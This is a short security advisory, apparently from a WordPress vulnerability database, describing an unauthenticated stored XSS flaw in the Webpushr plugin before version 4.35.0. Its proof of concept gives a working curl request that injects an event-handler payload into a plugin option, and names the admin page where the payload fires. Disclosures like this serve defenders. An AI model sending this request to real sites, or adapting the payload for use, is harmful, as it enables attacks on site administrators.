## WordPress Plugin Vulnerabilities

# Webpushr < 4.35.0 - Unauthenticated Stored XSS

### Description

The plugin does not prevent visitors on the site from changing some of the plugin options, some of which may be used to conduct Stored XSS attacks.

### Proof of Concept

1. Woocommerce needs to be installed as well as activating webpushr-web-push-notifications by creating an account.
2. Run the following curl request:
curl --url 'http://vulnerable-site.tld/wp-admin/admin-post.php' --data 'save\_woo\_settings=1&webpushr\_price\_drop=1&webpushr\_woo\_price\_drop\_icon="+style=animation-name:rotation;display:block+onanimationstart=alert(/XSS/)+x'
3. Have an administrator browse the price drop notification settings: http://vulnerable-site.tld/wp-admin/admin.php?page=webpushr-configuration&menu=price\_drop#woocommerce\_settings
